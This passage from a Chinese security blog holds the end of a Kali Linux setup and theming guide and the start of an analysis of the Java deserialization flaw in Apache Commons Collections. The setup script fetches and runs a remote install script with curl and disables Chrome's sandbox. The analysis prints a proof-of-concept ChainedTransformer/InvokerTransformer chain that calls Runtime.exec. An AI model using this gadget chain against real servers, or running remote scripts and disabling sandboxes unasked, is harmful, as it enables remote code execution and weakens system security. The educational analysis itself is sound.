：文件快速搜素工具，类似windows上的Everything\n\nbless：图形化的16进制编辑器\n\nbleachbit：图形化垃圾清理工具\n\nremmina：远程连接管理工具\n\nfilezilla：FTP客户端\n\ncherrytree：本地知识树笔记工具\n\nsynapse：系统应用程序快速启动工具\n\n\n其他值得独立安装的工具\n\nwps：office办公\nQQ&#x2F;TIM：appimage版qq和tim\nWechat：weweChat 、electronic-wechat\ntypora：markdown编辑器\nsublime text 3：代码编辑器\nstacer：图形化系统优化管理工具\nFalcon SQL Client：支持多种数据库的连接管理工具\nFranz：能够同时登录多个Mail、云盘、社交帐号等（基于web）的工具\nStation：类似Franz，能够在一个软件中登录管理多个帐号，界面更好看\n\n更多工具：https://www.linux-apps.com/\n三、系统美化全局设置:\n\n主题文件： &#x2F;usr&#x2F;share&#x2F;themes&#x2F;    \n图标文件： &#x2F;usr&#x2F;share&#x2F;icons&#x2F;            \n背景壁纸： &#x2F;usr&#x2F;share&#x2F;background&#x2F; 、 &#x2F;usr&#x2F;share&#x2F;wallpapers\nconky ： &#x2F;etc&#x2F;conky&#x2F;\n\n1.修改背景图片/usr/share/images/desktop-base    \nlogin-background.png　#进入系统界面的背景图kali-grub.png　　　　　#grub的背景图片(/usr/share/images/desktop-base)kali-wallpaper_1024×786 #类似的都是桌面背景图\n\n修改登录界面图片\n/usr/share/gnome-shell/theme/KaliLogin.png  /usr/share/images/desktop-base  desktop-grub.png  kali-grub.png\n\n2.修改主题主题文件位置：\ngnome主题网站： gnome-look.org \n选择GTK主题去 gnome-look.org 网站下载喜欢的GTK主题。这里我用的是McOS-MJV-Gnome-3.30 ，把下载的theme包解压到/usr/share/themes下。\n选择图标icons主题这里我使用的是：Korla icon theme ，下载完后，把图标主题包解压到/usr/share/icons下。\n选择鼠标主题Cursors主题下载 ，这里我用的是Breeze Black ,下载完后，把鼠标主题解压到/usr/share/icons下。\n打开gnome-tweaks ，在外观处选择对应主题\n\n默认的窗口按钮在右边，gnome环境下，将其换到左边的命令为：\ngsettings set org.gnome.desktop.wm.preferences button-layout &#x27;close,maximize,minimize:&#x27;\n\n整体效果\n\n 除了基本美化，还可以使用conky进行美化。\n3.添加gnome插件gnome提供了很多插件，用于丰富gnome功能，我们可以根据需要添加 gnome extensions来拓展功能。但是插件装的太多，会比较卡。插件存放路径：~/.local/share/gnome-shell/extensions/。\n每次装完插件，我们可以按下Alt+F2— 输入 r—回车 ，以此重启刷新gnome。\n下面是一些插件举例：\n\nAlternateTab     Alt+Tab切换应用 \nCoverflow Alt-Tab  功能与AlternateTab相同，但提供了一个更酷炫的界面 \nApplications Menu   顶栏显示应用菜单，我比较少用，但刚从Windows切换过来的或许需要 \nAuto Move Windows   当应用创建窗口时自动移动到某个特定的工作空间 \nCaffeine    取消自动锁屏 \nClipboard Indicator  剪贴板管理 \nDash to Dock 不解释 \nEasyScreenCast 屏幕录像，做演示时比较方便 （kali默认安装）\nScreenshot Tool 屏幕截图工具，也具有一些简单的图片编辑功能 \nSound Input &amp; Output Device Chooser 更为方便地调节音量 \nGnomodoro  简易番茄钟 \nTime ++  番茄钟，Todo-list，计时器等 \nHide Top Bar  全屏时自动隐藏顶栏\n Lock Keys 顶栏显示Numlock和Capslock的状态 \nNetSpeed 顶栏显示网速，喜欢简洁的Simple net speed也非常不错 \nOpenWeather 顶栏显示天气情况，gnome自带的weather不支持顶栏显示，用起来不方便 \nPlaces Status Indicator 为一些常用目录提供快速入口 \nsystem-monitor  顶栏显示CPU、内存、网速、温度、电池电量等信息，安装前需要解决依赖\n\n四、优化设置自定义快捷键延时截图sudo apt-get install scrotscrot -d 5 //延时5秒截图\n\n\n在系统设置—Keyboard设置中添加快捷键\n/bin/sh -c &quot;scrot -d 5&quot; \n\n\n按下快捷键，延时5秒截图完毕后会自动保存到家目录下。\n隐藏终端的用户信息  修改家目录的.bashrc文件，添加一行\nexport PS1=&#x27;\\[\\033[01;31m\\] &gt;&gt;&gt; \\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ &#x27;\n\n效果如下：\n\n右键文件编码转换kali下常常遇到文本文件因为编码问题而显示乱码的情况\n\n在~/.local/share/nautilus/scripts目录下新建一个bash文件ConvertZh-CN，内容为：\n#!/bin/bashiconv -f gb18030 -t utf-8 $NAUTILUS_SCRIPT_SELECTED_FILE_PATHS -o $NAUTILUS_SCRIPT_SELECTED_FILE_PATHS\n\n下次遇到乱码的文件只需要右键选中，在scripts中选择对应处理脚本即可方便地进行转换了，例如：\n\n右键功能拓展主要是~/.local/share/nautilus/scripts目录下增加nautilus脚本文件。可以自己编写，也可以从网上下载，这里有很多。\n五、常见问题网络设备未托管此问题表现症状可能是无法正常显示网络连接，比如无线：\nvi /etc/NetworkManager/NetworkManager.conf\n\n把 managed=false 的 false 改为true\n右键创建文件功能kali右键没有创建文件的功能，解决方法是，在家目录的Templates目录下放入你想要创建的模板类型即可\n安装其他版本jdk去oracle官网下载需要的jdk版本，比如jdk8，下载完毕后解压到&#x2F;opt&#x2F;目录下，然后编辑/etc/profile文件，添加以下内容：\nexport JAVA_HOME=/opt/jdk1.8.0_192export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib:$CLASSPATHexport JAVA_PATH=$&#123;JAVA_HOME&#125;/bin:$&#123;JRE_HOME&#125;/binexport PATH=$PATH:$&#123;JAVA_PATH&#125;\n\n笔者遇到了添加环境变量但是不生效的问题，后来发现是受到kali上其他版本jdk的影响。\n多java版本控制问题1.查看相应的jdk是否在 kali linux的jdk菜单里，如果有，直接选择你想切换的版本:\nupdate-alternatives --config javaupdate-alternatives --config javac\n\n2.如果没有在菜单里可以进行添加：\nupdate-alternatives --install /usr/bin/java java /opt/jdk1.8.0_121/bin/java 300update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_121/bin/javac 300 \n\n3.修改java版本\nupdate-alternatives --config javaupdate-alternatives --config javac\n\n注意：/opt/jdk1.8.0_121是自己安装的路径。300这个序号用于区分java版本，可以自定义但不能重复。\n修复apt-add-repository命令mv /usr/bin/add-apt-repository /usr/bin/add-apt-repository-baktouch /usr/sbin/add-apt-repository &amp;&amp; chmod +x /usr/sbin/add-apt-repository &amp;&amp; vi /usr/sbin/add-apt-repository\n\n添加以下内容：\n#!/bin/bashif [ $# -eq 1 ]NM=`uname -a &amp;&amp; date`NAME=`echo $NM | md5sum | cut -f1 -d&quot; &quot;`then  ppa_name=`echo &quot;$1&quot; | cut -d&quot;:&quot; -f2 -s`  if [ -z &quot;$ppa_name&quot; ]  then    echo &quot;PPA name not found&quot;    echo &quot;Utility to add PPA repositories in your debian machine&quot;    echo &quot;$0 ppa:user/ppa-name&quot;  else    echo &quot;$ppa_name&quot;    echo &quot;deb http://ppa.launchpad.net/$ppa_name/ubuntu xenial main&quot; &gt;&gt; /etc/apt/sources.list    apt-get update &gt;&gt; /dev/null 2&gt; /tmp/$&#123;NAME&#125;_apt_add_key.txt    key=`cat /tmp/$&#123;NAME&#125;_apt_add_key.txt | cut -d&quot;:&quot; -f6 | cut -d&quot; &quot; -f3`    apt-key adv --keyserver keyserver.ubuntu.com --recv-keys $key    rm -rf /tmp/$&#123;NAME&#125;_apt_add_key.txt  fielse  echo &quot;Utility to add PPA repositories in your debian machine&quot;  echo &quot;$0 ppa:user/ppa-name&quot;fi\n\n修复wireshark启动报错报错如下：\nLua: Error during loading: /usr/share/wireshark/init.lua:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user\n\n修改/usr/share/wireshark/init.lua文件，倒数第二行找到：\ndofile(DATA_DIR..&quot;console.lua&quot;)# 改为--dofile(DATA_DIR..&quot;console.lua&quot;)\n\n解决启动时默认静音问题sudo apt-get install alsa-utils -y\n\n解决root权限下无法运行chrome修改/usr/bin/google-chrome-stable文件：\nexec -a &quot;$0&quot; &quot;$HERE/chrome&quot; &quot;$@&quot; --no-sandbox --user-data-dir\n\nchromium也而是类似，修改/usr/share/applications/chromium.desktop文件：\nExec=/usr/bin/chromium %U --no-sandbox --user-data-dir\n\n在系统语言为英文的情况下，设置启动chrome时显示为中文修改/usr/bin/google-chrome-stable文件，添加一行即可\nexport LANGUAGE=zh-cn /opt/google/chrome/google-chrome %U\n\nvmware安装虚拟机增强工具sudo apt-get install open-vm-tools-desktop\n\n永久开启ip转发功能echo &quot;net.ipv4.ip_forward=1&quot; &gt;&gt; /etc/sysctl.conf   \n\nipv6网络转发：\necho 1 &gt; /proc/sys/net/ipv6/conf/all/forwarding\n\n一键安装配置脚本#!/bin/bashecho &quot;&quot;echo &quot;==========================================================================&quot;echo &quot;=               Kali Auto Init Tool                                      =&quot;echo &quot;= \t                 Powered by ssooking                               =&quot;echo &quot;= \t                 https://ssooking.github.io                        =&quot;echo &quot;==========================================================================&quot;echo &quot;&quot;echo &quot;[*] 即将自动对kali进行基本配置，建议你根据需要修改脚本。安装配置过程可能需要一会儿，并且由你的网速决定....&quot;read -p &quot;[*] 请按任意键继续....&quot;echo &quot;[+] 添加kali源&quot;apt-key adv --recv ED444FF07D8D0BF6echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.listecho &quot;deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib&quot; &gt;&gt; /etc/apt/sources.listecho &quot;deb http://mirrors.aliyun.com/debian stable main contrib non-free&quot;  &gt;&gt; /etc/apt/sources.listecho &quot;[ok] 添加kali源成功！&quot;echo &quot;&quot;echo &quot;[+] 添加一个普通用户&quot;read -p &quot;请输入用户名: &quot; usernameuseradd -m -G sudo,video,audio,cdrom -s /bin/bash $usernameecho &quot;请设置用户密码：&quot;passwd $usernameecho &quot;[ok] 添加普通用户成功！&quot;echo &quot;&quot;# 安装内核头文件echo &quot;[+] 安装内核头文件... &quot;apt-get -y install linux-headers-$(uname -r)echo &quot;&quot;echo &quot;[ok] 内核头文件安装成功！&quot;echo &quot;&quot;# 解决kali启动时静音问题echo &quot;[+] 安装 alsa-utils 解决kali启动时静音问题&quot;apt-get -y install alsa-utilsecho &quot;[ok] 安装 alsa-utils 成功！&quot;echo &quot;&quot;echo &quot;[+] 添加PPPoE拨号连接功能&quot;apt-get install pppoe pppoeconf echo &quot;[ok] 安装PPPoE成功!&quot;echo &quot; \t &gt;&gt; 你可以使用 nm-connection-editor 命令管理pppoe连接&quot;echo &quot;&quot;echo &quot;[+] 添加VPN支持: PPTP IPsec/IKEv2 vpnc network-manager-ssh&quot;apt-get -y install network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome network-manager-sshecho &quot;[ok] 成功添加vpn支持!&quot;echo &quot;&quot;# Base Toolecho &quot;[+] 安装一些必备系统工具：谷歌拼音输入法、垃圾清理工具、截图工具、快速启动工具、软件包管理工具等&quot;apt-get -y install  fcitx fcitx-googlepinyin flameshot bleachbit gdebi synaptic synapse catfish scrot vokoscreen chromiumecho &quot;[ok] 成功安装系统必备软件!&quot;echo &quot;&quot;# Server Toolsecho &quot;[+] 安装服务器连接管理工具：remmina、filezilla&quot;apt-get -y install remmina filezillaecho &quot;[ok] 安装服务器连接管理工具成功!&quot;echo &quot;&quot;# 美化echo &quot;[+] 设置窗口按钮到左侧&quot;gsettings set org.gnome.desktop.wm.preferences button-layout &#x27;close,maximize,minimize:&#x27;echo &quot;[ok] 设置窗口按钮到左侧成功！&quot;echo &quot;&quot;echo &quot;[+] 安装中文字体&quot;apt-get -y install fonts-wqy-microhei fonts-wqy-zenheiecho &quot;[ok] 安装中文字体成功！&quot;echo &quot;&quot;echo &quot;[+] 安装基本美化工具&quot;apt-get -y install zsh screenfetch neofetch figlet peek#apt-get -y install cairo-dockecho &quot;[ok] 安装成功！&quot;echo &quot;&quot;echo &quot;[+] 删除无用主题&quot;cd /usr/share/themes/ &amp;&amp; rm -rf Albatross Blackbird Bluebird HighContrast Greybird*echo &quot;[ok] 删除成功！&quot;# Security Toolsecho &quot;[+] 安装图形化十六进制编辑器bless&quot;apt-get -y install blessecho &quot;[ok] 安装成功！&quot;echo &quot;&quot;echo &quot;[+] 安装firewalld防火墙及iptables图形化管理工具gufw &quot;apt-get -y install gufw firewalld firewall-applet#systemctl enable firewalld.serviceecho &quot;[ok] 安装成功！&quot;echo &quot;&quot;# Install sublime text 3echo &quot;[+] 安装sublime text 3，速度可能会比较慢&quot;wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -sudo apt-get install apt-transport-httpsecho &quot;deb https://download.sublimetext.com/ apt/stable/&quot; | sudo tee /etc/apt/sources.list.d/sublime-text.listapt-get updateapt-get install sublime-textecho &quot;[+] 解决sublime-text 中文输入问题&quot;git clone https://github.com/lyfeyaj/sublime-text-imfix.gitcd sublime-text-imfixcp ./lib/libsublime-imfix.so /opt/sublime_text/ &amp;&amp; cp ./src/subl /usr/bin/echo &quot;[ok] 修复成功。输入subl命令启动sublime text即可输入中文！&quot;echo &quot;&quot;# Install typoraecho &quot;[+] 安装 typora，速度可能会比较慢&quot;sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys BA300B7755AFCFAEecho &quot;deb http://typora.io linux/&quot; | sudo tee /etc/apt/sources.list.d/typora.listsudo apt-get update -ysudo apt-get install typoraecho &quot;&quot;echo &quot;[+] 安装 node npm&quot;wget https://npm.taobao.org/mirrors/node/v8.9.3/node-v8.9.3.tar.gztar zxvf node-v8.9.3.tar.gz &amp;&amp; mv node-v8.9.3-linux-x64 /optln -s /opt/node-v8.9.3-linux-x64/bin/node /usr/local/bin/node  ln -s /opt/node-v8.9.3-linux-x64/bin/npm /usr/local/bin/npmrm ~/node-v8.9.3.tar.gzecho &quot;&quot;echo &quot;[+] 清除垃圾 ......&quot;apt-get clean &amp;&amp; apt-get autoclean &amp;&amp;  apt-get autoremove -y　echo &quot;[+] Cleaning OK!&quot;# Install oh-my-zsh# 普通用户就以普通权限安装apt-get install zshecho &quot;[+] Install oh-my-zsh&quot;sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;echo &quot; Setting oh-my-zsh be the default terminal&quot;chsh -s /bin/zshecho &quot;&quot;neofetchecho &quot;[OK] 所有任务完成!&quot;\n\n","categories":["神兵利器"],"tags":["kali"]},{"title":"Java反序列化漏洞分析","url":"/2016/10/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","content":"相关学习资料http://www.freebuf.com/vuls/90840.htmlhttps://security.tencent.com/index.php/blog/msg/97http://www.tuicool.com/articles/ZvMbInehttp://www.freebuf.com/vuls/86566.htmlhttp://sec.chinabyte.com/435/13618435.shtmlhttp://www.myhack58.com/Article/html/3/62/2015/69493_2.htmhttp://blog.nsfocus.net/java-deserialization-vulnerability-comments/http://www.ijiandao.com/safe/cto/18152.htmlhttps://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/http://www.cnblogs.com/dongchi/p/4796188.htmlhttps://blog.chaitin.com/2015-11-11_java_unserialize_rce/?from=timeline&amp;isappinstalled=0#h4_漏洞利用实例 \n\n背景　　2015年11月6日FoxGlove Security安全团队的@breenmachine 发布了一篇长博客，阐述了利用Java反序列化和Apache Commons Collections这一基础类库实现远程命令执行的真实案例，各大Java Web Server纷纷躺枪，这个漏洞横扫WebLogic、WebSphere、JBoss、Jenkins、OpenNMS的最新版。而在将近10个月前， Gabriel Lawrence 和Chris Frohoff 就已经在AppSecCali上的一个报告里提到了这个漏洞利用思路。　\n　　目前，针对这个”2015年最被低估”的漏洞，各大受影响的Java应用厂商陆续发布了修复后的版本，Apache Commons Collections项目也对存在漏洞的类库进行了一定的安全处理。但是网络上仍有大量网站受此漏洞影响。\n认识Java序列化与反序列化定义：\n　　序列化就是把对象的状态信息转换为字节序列(即可以存储或传输的形式)过程　　反序列化即逆过程，由字节流还原成对象　　注： 字节序是指多字节数据在计算机内存中存储或者网络传输时各字节的存储顺序。\n用途： \n　　1） 把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；　　2） 在网络上传送对象的字节序列。\n 应用场景：\n　　1) 一般来说，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载。这样就保证了用户信息不会丢失，实现永久化保存。\n　　2) 在很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存。\n　　　 比如最常见的是Web服务器中的Session对象，当有 10万用户并发访问，就有可能出现10万个Session对象，内存可能吃不消，于是Web容器就会把一些seesion先序列化到硬盘中，等要用了，再把保存在硬盘中的对象还原到内存中。\n　　例子： 淘宝每年都会有定时抢购的活动，很多用户会提前登录等待，长时间不进行操作，一致保存在内存中，而到达指定时刻，几十万用户并发访问，就可能会有几十万个session，内存可能吃不消。这时就需要进行对象的活化、钝化，让其在闲置的时候离开内存，将信息保存至硬盘，等要用的时候，就重新加载进内存。\nJava中的API实现： \n　　位置： Java.io.ObjectOutputStream 　java.io.ObjectInputStream\n　　序列化： ObjectOutputStream类 –&gt; writeObject()\n\n注：该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中按Java的标准约定是给文件一个.ser扩展名\n\n　　反序列化:　ObjectInputStream类 –&gt; readObject() 　\n\n 注：该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。\n\n简单测试代码：\nimport java.io.*;/*import java.io.ObjectOutputStream;import java.io.ObjectInputStream;import java.io.FileOutputStream;import java.io.FileInputStream;*/public class Java_Test&#123;    public static void main(String args[]) throws Exception &#123;        String obj = &quot;ls &quot;;        // 将序列化对象写入文件object.txt中        FileOutputStream fos = new FileOutputStream(&quot;aa.ser&quot;);        ObjectOutputStream os = new ObjectOutputStream(fos);        os.writeObject(obj);        os.close();        // 从文件object.txt中读取数据        FileInputStream fis = new FileInputStream(&quot;aa.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        // 通过反序列化恢复对象obj        String obj2 = (String)ois.readObject();        System.out.println(obj2);        ois.close();    &#125;&#125;\n\n　　我们可以看到，先通过输入流创建一个文件，再调用**ObjectOutputStream类的 writeObject方法把序列化的数据写入该文件;然后调用\\**ObjectInputStream类的readObject方法\\****反序列化数据并打印数据内容。\n　　实现Serializable和Externalizable接口的类的对象才能被序列化。\n　　Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以采用默认的序列化方式 。　　对象序列化包括如下步骤：　　1） 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流；　　2） 通过对象输出流的writeObject()方法写对象。\n　　对象反序列化的步骤如下：　　1） 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流；　　2） 通过对象输入流的readObject()方法读取对象。\n代码实例\n我们创建一个Person接口，然后写两个方法：\n\n序列化方法：   创建一个Person实例，调用函数为其三个成员变量赋值，通过writeObject方法把该对象序列化，写入Person.txt文件中\n反序列化方法：调用readObject方法，返回一个经过饭序列化处理的对象。\n在测试主类里，我们先序列化Person实例对象，然后又反序列化该对象，最后调用函数获取各个成员变量的值。\n\n测试代码如下：\nimport java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.text.MessageFormat;import java.io.Serializable;class Person implements Serializable &#123;    /**     * 序列化ID     */    private static final long serialVersionUID = -5809782578272943999L;    private int age;    private String name;    private String sex;    public int getAge() &#123;        return age;    &#125;    public String getName() &#123;        return name;    &#125;    public String getSex() &#123;        return sex;    &#125;    public void setAge(int age) &#123;        this.age = age;    &#125;    public void setName(String name) &#123;        this.name = name;    &#125;    public void setSex(String sex) &#123;        this.sex = sex;    &#125;&#125;/** * &lt;p&gt;ClassName: SerializeAndDeserialize&lt;p&gt; * &lt;p&gt;Description: 测试对象的序列化和反序列&lt;p&gt; */public class SerializeDeserialize_readObject &#123;    public static void main(String[] args) throws Exception &#123;        SerializePerson();//序列化Person对象        Person p = DeserializePerson();//反序列Perons对象        System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;,                                                 p.getName(), p.getAge(), p.getSex()));    &#125;    /**     * MethodName: SerializePerson     * Description: 序列化Person对象     */    private static void SerializePerson() throws FileNotFoundException,            IOException &#123;        Person person = new Person();        person.setName(&quot;ssooking&quot;);        person.setAge(20);        person.setSex(&quot;男&quot;);        // ObjectOutputStream 对象输出流，将Person对象存储到Person.txt文件中，完成对Person对象的序列化操作        ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(                new File(&quot;Person.txt&quot;)));        oo.writeObject(person);        System.out.println(&quot;Person对象序列化成功！&quot;);        oo.close();    &#125;    /**     * MethodName: DeserializePerson     * Description: 反序列Perons对象     */    private static Person DeserializePerson() throws Exception, IOException &#123;        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;Person.txt&quot;)));        /*            FileInputStream fis = new FileInputStream(&quot;Person.txt&quot;);             ObjectInputStream ois = new ObjectInputStream(fis);        */        Person person = (Person) ois.readObject();        System.out.println(&quot;Person对象反序列化成功！&quot;);        return person;    &#125;&#125;\n\n理解漏洞的产生 漏洞是怎么来的呢？\n　　我们既然已经知道了序列化与反序列化的过程，那么如果反序列化的时候，这些即将被反序列化的数据是我们特殊构造的呢！\n　　如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。\n漏洞分析从Apache Commons Collections说起\n项目地址官网：        http://commons.apache.org/proper/commons-collections/ Github:　　https://github.com/apache/commons-collections\n\n　　 由于对java序列化&#x2F;反序列化的需求，开发过程中常使用一些公共库。\n　　 Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库。它包含有很多jar工具包如下图所示，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。\n　　org.apache.commons.collections提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同罢了。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set，list，queue等等，它们是集合类型。换一种理解方式，collection是set，list，queue的抽象。\n　　　\n　　作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，而正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性。　\n　　 Apache Commons Collections中有一个特殊的接口，其中有一个实现该接口的类可以通过调用Java的反射机制来调用任意函数，叫做InvokerTransformer。\n\n什么事JAVA反射机制？    在运行状态中：        对于任意一个类，都能够判断一个对象所属的类；　    对于任意一个类，都能够知道这个类的所有属性和方法；　　对于任意一个对象，都能够调用它的任意一个方法和属性；这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制。\n\n 　这里涉及到了很多概念，不要着急，接下来我们就来详细的分析一下。\nPOC构造　　经过对前面序列与反序列化的了解，我们蠢蠢欲动。那么怎样利用这个漏洞呢？\n　　一丁点儿思路：\n构造一个对象 —— 反序列化 —— 提交数据\n\n　　OK? 我们现在遇到的关键问题是： 什么样对象符合条件？如何执行命令？怎样让它在被反序列化的时候执行命令？\n　　首先，我们可以知道，要想在java中调用外部命令，可以使用这个函数 Runtime.getRuntime().exec()，然而，我们现在需要先找到一个对象，可以存储并在特定情况下执行我们的命令。\n(1)Map类 –&gt; TransformedMap\n　　Map类是存储键值对的数据结构。 Apache Commons Collections中实现了TransformedMap ，该类可以在一个元素被添加&#x2F;删除&#x2F;或是被修改时(即key或value：集合中的数据存储形式即是一个索引对应一个值，就像身份证与人的关系那样)，会调用transform方法自动进行特定的修饰变换，具体的变换逻辑由Transformer类定义。也就是说，TransformedMap类中的数据发生改变时，可以自动对进行一些特殊的变换，比如在数据被修改时，把它改回来; 或者在数据改变时，进行一些我们提前设定好的操作。\n　　至于会进行怎样的操作或变换，这是由我们提前设定的，这个叫做transform。等会我们就来了解一下transform。\n　　我们可以通过TransformedMap.decorate()方法获得一个TransformedMap的实例\n\nTransformedMap.decorate方法,预期是对Map类的数据结构进行转化，该方法有三个参数：\n\n第一个参数为待转化的Map对象\n第二个参数为Map对象内的key要经过的转化方法（可为单个方法，也可为链，也可为空）\n第三个参数为Map对象内的value要经过的转化方法\n\n(2)Transformer接口 \nDefines a functor interface implemented by classes that transform one object into another.作用：接口于Transformer的类都具备把一个对象转化为另一个对象的功能\n\ntransform的源代码\n\n 我们可以看到该类接收一个对象，获取该对象的名称，然后调用了一个invoke反射方法。另外，多个Transformer还能串起来，形成ChainedTransformer。当触发时，ChainedTransformer可以按顺序调用一系列的变换。\n下面是一些实现Transformer接口的类，箭头标注的是我们会用到的。\n \nConstantTransformer：把一个对象转化为常量，并返回。\nInvokerTransformer：通过反射，返回一个对象\nChainedTransformer：ChainedTransformer为链式的Transformer，会挨个执行我们定义Transformer\n　　Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以通过Java的反射机制来调用任意函数，叫做InvokerTransformer，代码如下：\npublic class InvokerTransformer implements Transformer, Serializable &#123;...    /*        Input参数为要进行反射的对象，        iMethodName,iParamTypes为调用的方法名称以及该方法的参数类型        iArgs为对应方法的参数        在invokeTransformer这个类的构造函数中我们可以发现，这三个参数均为可控参数    */    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;        super();        iMethodName = methodName;        iParamTypes = paramTypes;        iArgs = args;    &#125;    public Object transform(Object input) &#123;        if (input == null) &#123;            return null;        &#125;        try &#123;            Class cls = input.getClass();            Method method = cls.getMethod(iMethodName, iParamTypes);            return method.invoke(input, iArgs);        &#125; catch (NoSuchMethodException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);        &#125; catch (IllegalAccessException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);        &#125; catch (InvocationTargetException ex) &#123;            throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);        &#125;    &#125;&#125;\n\n只需要传入方法名、参数类型和参数，即可调用任意函数。\n\n　　在这里，我们可以看到，先用ConstantTransformer()获取了Runtime类，接着反射调用getRuntime函数，再调用getRuntime的exec()函数，执行命令””。依次调用关系为： Runtime –&gt; getRuntime –&gt; exec()\n　　因此，我们要提前构造 ChainedTransformer链，它会按照我们设定的顺序依次调用Runtime, getRuntime,exec函数，进而执行命令。正式开始时，我们先构造一个TransformeMap实例，然后想办法修改它其中的数据，使其自动调用tansform()方法进行特定的变换(即我们之前设定好的)\n再理一遍：\n\n构造一个Map和一个能够执行代码的ChainedTransformer，\n生成一个TransformedMap实例\n利用MapEntry的setValue()函数对TransformedMap中的键值进行修改\n触发我们构造的之前构造的链式Transforme（即ChainedTransformer）进行自动转换\n\n知识补充\n\nMap是java中的接口，Map.Entry是Map的一个内部接口。Map提供了一些常用方法，如keySet()、entrySet()等方法。keySet()方法返回值是Map中key值的集合；entrySet()的返回值也是返回一个Set集合，此集合的类型为Map.Entry。Map.Entry是Map声明的一个内部接口，此接口为泛型，定义为Entry&lt;K,V&gt;。它表示Map中的一个实体（一个key-value对）。接口中有getKey(),getValue方法，可以用来对集合中的元素进行修改\n\n我们可以实现这个思路\npublic static void main(String[] args) throws Exception &#123;    //transformers: 一个transformer链，包含各类transformer对象（预设转化逻辑）的转化数组    Transformer[] transformers = new Transformer[] &#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;,             new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;            &quot;getRuntime&quot;, new Class[0] &#125;),        new InvokerTransformer(&quot;invoke&quot;,             new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;            null, new Object[0] &#125;),        new InvokerTransformer(&quot;exec&quot;,             new Class[] &#123;String.class &#125;, new Object[] &#123;&quot;calc.exe&quot;&#125;)&#125;;    //首先构造一个Map和一个能够执行代码的ChainedTransformer，以此生成一个TransformedMap    Transformer transformedChain = new ChainedTransformer(transformers);    Map innerMap = new hashMap();    innerMap.put(&quot;1&quot;, &quot;zhang&quot;);    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);    //触发Map中的MapEntry产生修改（例如setValue()函数    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();    onlyElement.setValue(&quot;foobar&quot;);    /*代码运行到setValue()时，就会触发ChainedTransformer中的一系列变换函数：       首先通过ConstantTransformer获得Runtime类       进一步通过反射调用getMethod找到invoke函数       最后再运行命令calc.exe。    */&#125;\n\n思考\n目前的构造还需要依赖于Map中某一项去调用setValue() 怎样才能在调用readObject()方法时直接触发执行呢？\n更近一步\n　　我们知道，如果一个类的方法被重写，那么在调用这个函数时，会优先调用经过修改的方法。因此，如果某个可序列化的类重写了readObject()方法，并且在readObject()中对Map类型的变量进行了键值修改操作，且这个Map变量是可控的，我么就可以实现攻击目标。\n　　于是，我们开始寻寻觅觅，终于，我们找到了~\n　　AnnotationInvocationHandler类\n这个类有一个成员变量memberValues是Map类型 更棒的是，AnnotationInvocationHandler的readObject()函数中对memberValues的每一项调用了setValue()函数对value值进行一些变换。\n\n\n　　